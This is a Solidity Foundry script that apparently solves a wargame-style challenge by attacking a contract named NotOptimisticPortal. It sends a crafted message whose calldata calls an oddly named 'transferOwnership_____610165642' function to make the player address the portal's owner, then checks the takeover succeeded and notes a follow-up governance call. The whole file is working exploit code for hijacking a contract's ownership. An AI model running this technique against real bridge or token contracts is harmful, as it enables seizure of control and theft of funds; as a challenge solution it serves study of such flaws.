// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {NotOptimisticPortal} from "./NotOptimisticPortal.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import {Script, console} from "forge-std/Script.sol";

contract NotOptimisticPortalScript is Script {
    address constant TARGET_ADDR = 0x2beEb86F201F7F09A92FA8F5D73F9985b637aFaD;
    address constant PLAYER_ADDR = 0xB0fD5a878DBF3F9358A251caF9b6Fc692A999cA7;

    function run() public {
        vm.startBroadcast();

        NotOptimisticPortal portal = NotOptimisticPortal(TARGET_ADDR);
        ERC20 asToken = ERC20(TARGET_ADDR);

        _showInfo(portal, asToken);

        // Construct and sendMessage
        // uint256 amount = 10e6;
        bytes memory cdata0 = abi.encodeWithSignature("onMessageReceived(bytes)", abi.encode(0));
        bytes memory cdata1 = abi.encodeWithSignature("transferOwnership_____610165642(address)", PLAYER_ADDR);
        uint256 salt = 1;

        address[] memory receiverArr = new address[](2);
        receiverArr[0] = PLAYER_ADDR;
        receiverArr[1] = PLAYER_ADDR;

        bytes[] memory dataArr = new bytes[](2);
        dataArr[0] = cdata0;
        dataArr[1] = cdata1;

        portal.sendMessage(0, receiverArr, dataArr, salt);
        // portal.executeMessage(PLAYER_ADDR, 0,
        //     receiverArr, dataArr, salt, proofs, bufferIndex);

        // Given this step, I should be the owner of NotOptimisticPortal.
        require(portal.owner() == PLAYER_ADDR, "portal owner is not PLAYER_ADDR");

        // And then execute the `governanceAction_____2357862414()` call

        vm.stopBroadcast();
    }

    function _showInfo(NotOptimisticPortal portal, ERC20 asToken) internal view {
        console.log("owner: %s\nsequencer: %s\ngovernance: %s", portal.owner(), portal.sequencer(), portal.governance());

        console.log("bufCnt: %s\nl2StateRoot:", portal.bufferCounter());
        console.logBytes32(portal.l2StateRoots(0));

        console.log("name: %s\nsymbol: %s", asToken.name(), asToken.symbol());

        console.log("total supply: %s", asToken.totalSupply());
        console.log("owner bal: %s", asToken.balanceOf(portal.owner()));
        console.log("player bal: %s", asToken.balanceOf(PLAYER_ADDR));
    }
}
